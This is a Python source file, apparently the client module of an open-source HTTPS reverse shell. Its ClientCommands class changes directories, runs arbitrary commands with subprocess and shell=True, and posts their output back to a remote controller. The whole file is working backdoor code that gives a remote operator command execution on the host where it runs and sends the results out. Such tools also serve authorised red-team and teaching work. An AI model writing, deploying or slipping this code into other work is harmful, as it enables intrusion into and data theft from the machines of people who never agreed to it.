#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Basic-HTTPS-Reverse-Shell

__author__ = "EONRaider @ keybase.io/eonraider"

import os
import subprocess
from pathlib import Path


class ClientCommands:
    def __init__(self, client):
        self.client = client

    def _send_output(self, message: [str, bytes]) -> None:
        self.client.post({"output": message})

    def cd(self, dest_dir: [str, list]) -> None:
        try:
            dest_dir = "~" if len(dest_dir) == 0 else "".join(dest_dir)
            os.chdir(Path(dest_dir).expanduser())
        except FileNotFoundError as e:
            self._send_output(f"{e}\n")

    def shell(self, command: str) -> None:
        try:
            cmd = subprocess.run(command, capture_output=True, shell=True)
        except FileNotFoundError as e:
            self._send_output(f"{e}\n")
        else:
            for result in cmd.stdout, cmd.stderr:
                if len(result) > 0:
                    self._send_output(result)

    @staticmethod
    def get_cwd() -> Path:
        return Path.cwd()
